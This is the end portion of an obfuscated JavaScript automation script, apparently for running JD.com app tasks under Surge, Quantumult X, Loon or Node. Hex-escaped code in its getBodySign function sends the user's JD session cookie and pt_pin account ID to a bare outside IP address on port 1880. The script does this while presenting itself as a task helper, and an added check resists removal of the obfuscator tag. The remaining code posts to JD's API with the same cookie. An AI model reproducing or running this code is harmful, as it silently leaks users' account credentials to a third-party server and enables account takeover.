s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}

var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdd5e5=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x30\x2F\x64\x64\x71\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","\x26\x54\x79\x70\x65\x3D","","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x64\x61\x74\x61","\x64\x61\x74\x61\x31","\x64\x61\x74\x61\x32","\x64\x61\x74\x61\x33","\x64\x61\x74\x61\x34","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function getBodySign(_0x48abx2,_0x48abx3,_0x48abx4){return  new Promise((_0x48abx5)=>{$[__Oxdd5e5[0xc]]({url:`${__Oxdd5e5[0x0]}${_0x48abx2}${__Oxdd5e5[0x1]}${_0x48abx3}${__Oxdd5e5[0x2]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x70\x74\x5F\x70\x69\x6E":_0x48abx4,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua}},(_0x48abx6,_0x48abx7,_0x48abx8)=>{try{_0x48abx8= JSON[__Oxdd5e5[0x3]](_0x48abx8);data1= _0x48abx8[__Oxdd5e5[0x4]];helpno= _0x48abx8[__Oxdd5e5[0x5]]+ _0x48abx8[__Oxdd5e5[0x6]]+ _0x48abx8[__Oxdd5e5[0x7]]+ _0x48abx8[__Oxdd5e5[0x8]]+ _0x48abx8[__Oxdd5e5[0x9]]}catch(e){$[__Oxdd5e5[0xb]](__Oxdd5e5[0xa],e)}finally{_0x48abx5(data1)}})})}(function(_0x48abx9,_0x48abxa,_0x48abxb,_0x48abxc,_0x48abxd,_0x48abxe){_0x48abxe= __Oxdd5e5[0xd];_0x48abxc= function(_0x48abxf){if( typeof alert!== _0x48abxe){alert(_0x48abxf)};if( typeof console!== _0x48abxe){console[__Oxdd5e5[0xe]](_0x48abxf)}};_0x48abxb= function(_0x48abx10,_0x48abx9){return _0x48abx10+ _0x48abx9};_0x48abxd= _0x48abxb(__Oxdd5e5[0xf],_0x48abxb(_0x48abxb(__Oxdd5e5[0x10],__Oxdd5e5[0x11]),__Oxdd5e5[0x12]));try{_0x48abx9= __encode;if(!( typeof _0x48abx9!== _0x48abxe&& _0x48abx9=== _0x48abxb(__Oxdd5e5[0x13],__Oxdd5e5[0x14]))){_0x48abxc(_0x48abxd)}}catch(e){_0x48abxc(_0x48abxd)}})({})

var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdd5e7=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x3F\x61\x70\x70\x69\x64\x3D\x63\x6F\x75\x70\x6F\x6E\x2D\x6E\x65\x63\x6B\x6C\x61\x63\x65\x26\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","\x26\x6C\x6F\x67\x69\x6E\x54\x79\x70\x65\x3D\x32\x26\x74\x3D","\x6E\x6F\x77","\x26\x75\x75\x69\x64\x3D","","\x61\x70\x69\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x35\x2E\x6D\x2E\x6A\x64\x2E\x63\x6F\x6D","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E\x2C\x20\x74\x65\x78\x74\x2F\x70\x6C\x61\x69\x6E\x2C\x20\x2A\x2F\x2A","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x69\x73\x4E\x6F\x64\x65","\x4A\x44\x5F\x55\x53\x45\x52\x5F\x41\x47\x45\x4E\x54","\x65\x6E\x76","\x55\x53\x45\x52\x5F\x41\x47\x45\x4E\x54","\x2E\x2F\x55\x53\x45\x52\x5F\x41\x47\x45\x4E\x54\x53","\x4A\x44\x55\x41","\x67\x65\x74\x64\x61\x74\x61","\x6A\x64\x61\x70\x70\x3B\x69\x50\x68\x6F\x6E\x65\x3B\x39\x2E\x34\x2E\x34\x3B\x31\x34\x2E\x33\x3B\x6E\x65\x74\x77\x6F\x72\x6B\x2F\x34\x67\x3B\x4D\x6F\x7A\x69\x6C\x6C\x61\x2F\x35\x2E\x30\x20\x28\x69\x50\x68\x6F\x6E\x65\x3B\x20\x43\x50\x55\x20\x69\x50\x68\x6F\x6E\x65\x20\x4F\x53\x20\x31\x34\x5F\x33\x20\x6C\x69\x6B\x65\x20\x4D\x61\x63\x20\x4F\x53\x20\x58\x29\x20\x41\x70\x70\x6C\x65\x57\x65\x62\x4B\x69\x74\x2F\x36\x30\x35\x2E\x31\x2E\x31\x35\x20\x28\x4B\x48\x54\x4D\x4C\x2C\x20\x6C\x69\x6B\x65\x20\x47\x65\x63\x6B\x6F\x29\x20\x4D\x6F\x62\x69\x6C\x65\x2F\x31\x35\x45\x31\x34\x38\x3B\x73\x75\x70\x70\x6F\x72\x74\x4A\x44\x53\x48\x57\x4B\x2F\x31","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x6C\x6F\x67","\x6E\x61\x6D\x65","\x20\x41\x50\x49\u8BF7\u6C42\u5931\u8D25\uFF0C\u8BF7\u68C0\u67E5\u7F51\u8DEF\u91CD\u8BD5","\x70\x61\x72\x73\x65","\u670D\u52A1\u5668\u8FD4\u56DE\u7A7A\u6570\u636E","\x6C\x6F\x67\x45\x72\x72","\x70\x6F\x73\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function startTask(_0x72cbx2,_0x72cbx3){return  new Promise(async (_0x72cbx4)=>{const _0x72cbx5={url:`${__Oxdd5e7[0x0]}${_0x72cbx2}${__Oxdd5e7[0x1]}${Date[__Oxdd5e7[0x2]]()}${__Oxdd5e7[0x3]}${_0x72cbx3}${__Oxdd5e7[0x4]}`,body:helpno,headers:{"\x61\x75\x74\x68\x6F\x72\x69\x74\x79":__Oxdd5e7[0x5],"\x6F\x72\x69\x67\x69\x6E":__Oxdd5e7[0x6],"\x61\x63\x63\x65\x70\x74":__Oxdd5e7[0x7],"\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65":__Oxdd5e7[0x8],"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":$[__Oxdd5e7[0x9]]()?(process[__Oxdd5e7[0xb]][__Oxdd5e7[0xa]]?process[__Oxdd5e7[0xb]][__Oxdd5e7[0xa]]:(require(__Oxdd5e7[0xd])[__Oxdd5e7[0xc]])):($[__Oxdd5e7[0xf]](__Oxdd5e7[0xe])?$[__Oxdd5e7[0xf]](__Oxdd5e7[0xe]):__Oxdd5e7[0x10])}};$[__Oxdd5e7[0x18]](_0x72cbx5,(_0x72cbx6,_0x72cbx7,_0x72cbx8)=>{try{if(_0x72cbx6){console[__Oxdd5e7[0x12]](`${__Oxdd5e7[0x4]}${JSON[__Oxdd5e7[0x11]](_0x72cbx6)}${__Oxdd5e7[0x4]}`);console[__Oxdd5e7[0x12]](`${__Oxdd5e7[0x4]}${$[__Oxdd5e7[0x13]]}${__Oxdd5e7[0x14]}`)}else {if(_0x72cbx8){_0x72cbx8= JSON[__Oxdd5e7[0x15]](_0x72cbx8)}else {console[__Oxdd5e7[0x12]](`${__Oxdd5e7[0x16]}`)}}}catch(e){$[__Oxdd5e7[0x17]](e)}finally{_0x72cbx4(_0x72cbx8)}})})}(function(_0x72cbx9,_0x72cbxa,_0x72cbxb,_0x72cbxc,_0x72cbxd,_0x72cbxe){_0x72cbxe= __Oxdd5e7[0x19];_0x72cbxc= function(_0x72cbxf){if( typeof alert!== _0x72cbxe){alert(_0x72cbxf)};if( typeof console!== _0x72cbxe){console[__Oxdd5e7[0x12]](_0x72cbxf)}};_0x72cbxb= function(_0x72cbx10,_0x72cbx9){return _0x72cbx10+ _0x72cbx9};_0x72cbxd= _0x72cbxb(__Oxdd5e7[0x1a],_0x72cbxb(_0x72cbxb(__Oxdd5e7[0x1b],__Oxdd5e7[0x1c]),__Oxdd5e7[0x1d]));try{_0x72cbx9= __encode;if(!( typeof _0x72cbx9!== _0x72cbxe&& _0x72cbx9=== _0x72cbxb(__Oxdd5e7[0x1e],__Oxdd5e7[0x1f]))){_0x72cbxc(_0x72cbxd)}}catch(e){_0x72cbxc(_0x72cbxd)}})({})






